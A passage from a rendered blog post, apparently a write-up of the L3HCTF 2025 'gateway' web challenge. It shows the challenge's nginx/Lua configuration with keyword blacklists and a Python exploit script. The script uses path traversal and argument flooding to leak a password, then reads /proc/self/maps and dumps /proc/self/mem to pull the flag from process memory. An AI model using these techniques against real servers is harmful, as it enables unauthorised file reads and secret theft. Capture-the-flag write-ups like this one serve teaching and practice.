class="built_in">close</span>()</span><br><span class="line">        password = string.<span class="built_in">gsub</span>(password, <span class="string">&quot;[\n\r]&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        os.<span class="built_in">remove</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">        os.<span class="built_in">remove</span>(<span class="string">&quot;/password&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen <span class="number">80</span> default_server;</span><br><span class="line">        location / &#123;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                ngx<span class="selector-class">.say</span>(&quot;hello, world!&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /static &#123;</span><br><span class="line">            alias /www/;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                if ngx<span class="selector-class">.var</span><span class="selector-class">.remote_addr</span> ~= &quot;<span class="number">127.0</span>.<span class="number">0.1</span>&quot; then</span><br><span class="line">                    ngx<span class="selector-class">.exit</span>(<span class="number">403</span>)</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            add_header Accept-Ranges bytes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /download &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                local blacklist = &#123;&quot;%.&quot;, &quot;/&quot;, &quot;;&quot;, &quot;flag&quot;, &quot;proc&quot;&#125;</span><br><span class="line">                local args = ngx<span class="selector-class">.req</span><span class="selector-class">.get_uri_args</span>()</span><br><span class="line">                for k, v in pairs(args) do</span><br><span class="line">                    for _, <span class="selector-tag">b</span> in ipairs(blacklist) do</span><br><span class="line">                        if string<span class="selector-class">.find</span>(v, <span class="selector-tag">b</span>) then</span><br><span class="line">                            ngx<span class="selector-class">.exit</span>(<span class="number">403</span>)</span><br><span class="line">                        end</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            add_header <span class="attribute">Content</span>-Disposition &quot;attachment; filename=download<span class="selector-class">.txt</span>&quot;;</span><br><span class="line">            proxy_pass http://<span class="number">127.0</span>.<span class="number">0.1</span>/static$arg_filename;</span><br><span class="line">            body_filter_by_lua_block &#123;</span><br><span class="line">                local blacklist = &#123;&quot;flag&quot;, &quot;l3hsec&quot;, &quot;l3hctf&quot;, &quot;password&quot;, &quot;secret&quot;, &quot;confidential&quot;&#125;</span><br><span class="line">                for _, <span class="selector-tag">b</span> in ipairs(blacklist) do</span><br><span class="line">                    if string<span class="selector-class">.find</span>(ngx<span class="selector-class">.arg</span><span class="selector-attr">[1]</span>, <span class="selector-tag">b</span>) then</span><br><span class="line">                        ngx<span class="selector-class">.arg</span><span class="selector-attr">[1]</span> = string<span class="selector-class">.rep</span>(&quot;*&quot;, string<span class="selector-class">.len</span>(ngx<span class="selector-class">.arg</span><span class="selector-attr">[1]</span>))</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /read_anywhere &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                if ngx<span class="selector-class">.var</span><span class="selector-class">.http_x_gateway_password</span> ~= password then</span><br><span class="line">                    ngx<span class="selector-class">.say</span>(&quot;go find the password first!&quot;)</span><br><span class="line">                    ngx<span class="selector-class">.exit</span>(<span class="number">403</span>)</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                local f = io<span class="selector-class">.open</span>(ngx<span class="selector-class">.var</span><span class="selector-class">.http_x_gateway_filename</span>, &quot;r&quot;)</span><br><span class="line">                if not f then</span><br><span class="line">                    ngx<span class="selector-class">.exit</span>(<span class="number">404</span>)</span><br><span class="line">                end</span><br><span class="line">                local start = tonumber(ngx<span class="selector-class">.var</span><span class="selector-class">.http_x_gateway_start</span>) or <span class="number">0</span></span><br><span class="line">                local length = tonumber(ngx<span class="selector-class">.var</span><span class="selector-class">.http_x_gateway_length</span>) or <span class="number">1024</span></span><br><span class="line">                if length &gt; <span class="number">1024</span> * <span class="number">1024</span> then</span><br><span class="line">                    length = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">                end</span><br><span class="line">                f:<span class="built_in">seek</span>(<span class="string">&quot;set&quot;</span>, start)</span><br><span class="line">                local content = f:<span class="built_in">read</span>(length)</span><br><span class="line">                f:<span class="built_in">close</span>()</span><br><span class="line">                ngx.<span class="built_in">say</span>(content)</span><br><span class="line">                ngx.header[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&quot;application/octet-stream&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">defget_flag(base_url, password):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] Stage 2: Attempting to capture flag from process memory...&quot;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Gateway-Password&quot;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1: Get the memory map</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Reading /proc/self/maps...&quot;</span>)</span><br><span class="line">    headers[<span class="string">&quot;X-Gateway-Filename&quot;</span>] = <span class="string">&quot;/proc/self/maps&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/read_anywhere&quot;</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to get memory map. Status: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        maps_data = r.text</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Successfully retrieved memory map.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2 &amp; 3: Parse map, dump memory regions, and search for flag</span></span><br><span class="line">        headers[<span class="string">&quot;X-Gateway-Filename&quot;</span>] = <span class="string">&quot;/proc/self/mem&quot;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> maps_data.splitlines():</span><br><span class="line">            <span class="comment"># Look for readable-writable private memory segments (like heap)</span></span><br><span class="line">            <span class="keyword">if</span><span class="string">&#x27;rw-p&#x27;</span>notin line:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;([0-9a-f]+)-([0-9a-f]+)&#x27;</span>, line)</span><br><span class="line">            ifnotmatch:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            start_hex, end_hex = <span class="keyword">match</span>.groups()</span><br><span class="line">            start_addr = <span class="built_in">int</span>(start_hex, <span class="number">16</span>)</span><br><span class="line">            end_addr = <span class="built_in">int</span>(end_hex, <span class="number">16</span>)</span><br><span class="line">            size = end_addr - start_addr</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Dumping memory region: <span class="subst">&#123;start_hex&#125;</span>-<span class="subst">&#123;end_hex&#125;</span> (Size: <span class="subst">&#123;size&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Read in chunks to avoid hitting server-side limits</span></span><br><span class="line">            chunk_size = <span class="number">1024</span> * <span class="number">64</span><span class="comment"># 64KB chunks</span></span><br><span class="line">            <span class="keyword">for</span> offset inrange(<span class="number">0</span>, size, chunk_size):</span><br><span class="line">                current_addr = start_addr + offset</span><br><span class="line">                read_len = <span class="built_in">min</span>(chunk_size, size - offset)</span><br><span class="line"></span><br><span class="line">                headers[<span class="string">&quot;x-gateway-start&quot;</span>] = <span class="built_in">str</span>(current_addr)</span><br><span class="line">                headers[<span class="string">&quot;X-Gateway-Length&quot;</span>] = <span class="built_in">str</span>(read_len)</span><br><span class="line"></span><br><span class="line">                mem_r = requests.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/read_anywhere&quot;</span>, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="comment">#print(mem_r.text)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Use raw content to avoid text decoding issues</span></span><br><span class="line">                flag_match = re.search(<span class="string">rb&#x27;L3HCTF\&#123;[a-zA-Z0-9_]+\&#125;&#x27;</span>, mem_r.content)</span><br><span class="line">                <span class="keyword">if</span> flag_match:</span><br><span class="line">                    flag = flag_match.group(<span class="number">0</span>).decode()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] SUCCESS! Flag found: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] An error occurred during flag capture: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#target_url=&quot;http://127.0.0.1:8088&quot;</span></span><br><span class="line">    target_url=<span class="string">&quot;http://1.95.8.146:17794&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#第一步拿password</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># target_url+=&quot;/download?&quot;</span></span><br><span class="line">    <span class="comment"># for i in range(100):</span></span><br><span class="line">    <span class="comment">#     target_url+=str(i)+&quot;=&quot;+&quot;1&amp;&quot;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># target_url+=&quot;filename=%2e%2e%2fproc/self/fd/6&quot;</span></span><br><span class="line">    <span class="comment"># my_headers = &#123;</span></span><br><span class="line">    <span class="comment">#     &#x27;Range&#x27;: &#x27;bytes=41-50&#x27;  # 请求从字节0到字节4的部分</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># #passwordismemeispasswordsoneverwannagiveyouup</span></span><br><span class="line">    <span class="comment"># print(target_url)</span></span><br><span class="line">    <span class="comment"># r=requests.get(target_url,headers=my_headers)</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#第二步拿flag</span></span><br><span class="line"></span><br><span class="line">    leaked_password = <span class="string">&quot;passwordismemeispasswordsoneverwannagiveyouup&quot;</span></span><br><span class="line">    <span class="keyword">if</span> leaked_password:</span><br><span class="line">        get_flag(target_url, leaked_password)</span><br></pre></td></tr></table></figure></div>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> L3HCTF2025WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-07-15 19:07:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-19 18:27:22
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/07/15/L3HCTF2025WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/08/02/DASCTF2025%20%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B%E5%AE%98%E6%96%B9WP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">DASCTF2025上半年赛官方WP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/06/10/D%5E3CTF2025WP/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">D^3CTF2025WP</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">L3HCTF2025WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#best-profile"><span class="nav-text">best_profile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gateway"><span class="nav-text">gateway</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
